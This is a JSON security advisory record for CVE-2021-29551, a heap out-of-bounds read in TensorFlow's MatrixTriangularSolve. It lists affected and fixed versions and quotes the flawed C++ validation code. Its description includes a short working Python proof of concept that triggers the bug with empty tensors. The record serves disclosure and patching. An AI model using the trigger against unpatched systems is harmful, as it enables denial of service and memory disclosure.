{
  "Identifier": "CVE-2021-29551",
  "PackageSlug": "pypi/tensorflow-gpu",
  "Title": "OOB read in `MatrixTriangularSolve`",
  "Description": "The implementation of [`MatrixTriangularSolve`](https://github.com/tensorflow/tensorflow/blob/8cae746d8449c7dda5298327353d68613f16e798/tensorflow/core/kernels/linalg/matrix_triangular_solve_op_impl.h#L160-L240) fails to terminate kernel execution if one validation condition fails:\n\n```cc\nvoid ValidateInputTensors(OpKernelContext* ctx, const Tensor\u0026 in0,\nconst Tensor\u0026 in1) override {\nOP_REQUIRES(\nctx, in0.dims() \u003e= 2,\nerrors::InvalidArgument(\"In[0] ndims must be \u003e= 2: \", in0.dims()));\n\nOP_REQUIRES(\nctx, in1.dims() \u003e= 2,\nerrors::InvalidArgument(\"In[0] ndims must be \u003e= 2: \", in1.dims()));\n}\n\nvoid Compute(OpKernelContext* ctx) override {\nconst Tensor\u0026 in0 = ctx-\u003einput(0);\nconst Tensor\u0026 in1 = ctx-\u003einput(1);\n\nValidateInputTensors(ctx, in0, in1);\n\nMatMulBCast bcast(in0.shape().dim_sizes(), in1.shape().dim_sizes());\n...\n}\n```\n\nSince `OP_REQUIRES` only sets `ctx-\u003estatus()` to a non-OK value and calls `return`, this allows malicious attackers to trigger an out of bounds read:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nmatrix_array = np.array([])\nmatrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(1,0)),dtype=tf.float32)\nrhs_array = np.array([])\nrhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(0,1)),dtype=tf.float32)\n\ntf.raw_ops.MatrixTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor,lower=False,adjoint=False)\n```\n\nAs the two input tensors are empty, the `OP_REQUIRES` in `ValidateInputTensors` should fire and interrupt execution. However, given the implementation of `OP_REQUIRES`, after the `in0.dims() \u003e= 2` fails, execution moves to the initialization of the `bcast` object. This initialization is done with invalid data and results in heap OOB read.",
  "Date": "2024-10-31",
  "Pubdate": "2021-05-21",
  "AffectedRange": "\u003c2.1.4||\u003e=2.2.0,\u003c2.2.3||\u003e=2.3.0,\u003c2.3.3||\u003e=2.4.0,\u003c2.4.2",
  "FixedVersions": [
    "2.1.4",
    "2.2.3",
    "2.3.3",
    "2.4.2"
  ],
  "AffectedVersions": "All versions before 2.1.4, all versions starting from 2.2.0 before 2.2.3, all versions starting from 2.3.0 before 2.3.3, all versions starting from 2.4.0 before 2.4.2",
  "NotImpacted": "All versions starting from 2.1.4 before 2.2.0, all versions starting from 2.2.3 before 2.3.0, all versions starting from 2.3.3 before 2.4.0, all versions starting from 2.4.2",
  "Solution": "Upgrade to versions 2.1.4, 2.2.3, 2.3.3, 2.4.2 or above.",
  "Urls": [
    "https://nvd.nist.gov/vuln/detail/CVE-2021-29551",
    "https://github.com/advisories/GHSA-vqw6-72r7-fgw7",
    "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vqw6-72r7-fgw7",
    "https://github.com/tensorflow/tensorflow/commit/480641e3599775a8895254ffbc0fc45621334f68",
    "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-479.yaml",
    "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-677.yaml",
    "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-188.yaml",
    "https://github.com/tensorflow/tensorflow"
  ],
  "CvssV2": "AV:L/AC:L/Au:N/C:N/I:N/A:P",
  "CvssV3": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
  "UUID": "0e18af7b-f788-4c0d-8e8f-e0b62692e514"
}